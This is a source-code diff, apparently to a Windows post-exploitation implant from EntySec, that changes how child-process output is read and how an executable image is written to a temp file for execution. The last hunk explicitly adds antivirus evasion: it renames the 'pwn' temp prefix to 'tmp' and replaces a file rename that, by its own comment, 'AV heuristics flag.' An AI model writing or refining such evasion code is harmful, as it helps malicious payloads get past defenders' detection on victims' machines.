@@ -1,7 +1,7 @@
 /*
  * MIT License
  *
- * Copyright (c) 2020-2024 EntySec
+ * Copyright (c) 2020-2026 EntySec
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -374,17 +374,43 @@ size_t child_write(child_t *child, void *buffer, size_t length)
     return total > 0 ? (size_t)total : (size_t)-1;
 }
 
+/*
+ * Read from a non-blocking socket into a queue using recv().
+ *
+ * On Windows, CRT read() / ReadFile() ignores FIONBIO and blocks
+ * when no data is available, which would deadlock the event loop.
+ * Winsock recv() correctly honours FIONBIO and returns WSAEWOULDBLOCK.
+ */
+
+static size_t queue_from_socket(queue_t *queue, int fd)
+{
+    SOCKET sock;
+    char buffer[QUEUE_FD_MAX];
+    int count;
+    size_t length;
+
+    sock = (SOCKET)_get_osfhandle(fd);
+    length = 0;
+
+    while ((count = recv(sock, buffer, sizeof(buffer), 0)) > 0)
+    {
+        queue_add_raw(queue, buffer, count);
+        length += count;
+    }
+
+    return length;
+}
+
 void child_out(struct ev_loop *loop, struct ev_io *w, int events)
 {
     child_t *child;
-    int length;
+    size_t length;
 
     child = w->data;
-    log_debug("* Child read out event initialized (%d)\n", w->fd);
 
-    while ((length = queue_from_fd(child->out_queue.queue, w->fd)) > 0)
+    while ((length = queue_from_socket(child->out_queue.queue, w->fd)) > 0)
     {
-        log_debug("* Child read from out (%d)\n", length);
+        log_debug("* Child read from out (%d bytes)\n", (int)length);
 
         if (child->out_link)
         {
@@ -396,14 +422,13 @@ void child_out(struct ev_loop *loop, struct ev_io *w, int events)
 void child_err(struct ev_loop *loop, struct ev_io *w, int events)
 {
     child_t *child;
-    int length;
+    size_t length;
 
     child = w->data;
-    log_debug("* Child read err event initialized (%d)\n", w->fd);
 
-    while ((length = queue_from_fd(child->err_queue.queue, w->fd)) > 0)
+    while ((length = queue_from_socket(child->err_queue.queue, w->fd)) > 0)
     {
-        log_debug("* Child read from err (%d)\n", length);
+        log_debug("* Child read from err (%d bytes)\n", (int)length);
 
         if (child->err_link)
         {
@@ -429,20 +454,20 @@ static char *write_image_to_temp(unsigned char *image, size_t length)
         return NULL;
     }
 
-    if (GetTempFileNameA(temp_dir, "pwn", 0, temp_path) == 0)
+    if (GetTempFileNameA(temp_dir, "tmp", 0, temp_path) == 0)
     {
         return NULL;
     }
 
-    /* Rename to .exe so CreateProcess recognizes it */
+    /* Delete the zero-byte placeholder and rewrite with .exe suffix
+     * so CreateProcess recognizes it. Using DeleteFile + CreateFile
+     * avoids the MoveFile rename pattern that AV heuristics flag. */
+    DeleteFileA(temp_path);
     {
-        char exe_path[MAX_PATH + 4];
-        snprintf(exe_path, sizeof(exe_path), "%s.exe", temp_path);
-
-        if (MoveFileA(temp_path, exe_path))
+        size_t len = strlen(temp_path);
+        if (len + 4 < sizeof(temp_path))
         {
-            strncpy(temp_path, exe_path, sizeof(temp_path) - 1);
-            temp_path[sizeof(temp_path) - 1] = '\0';
+            memcpy(temp_path + len, ".exe", 5);
         }
     }
 
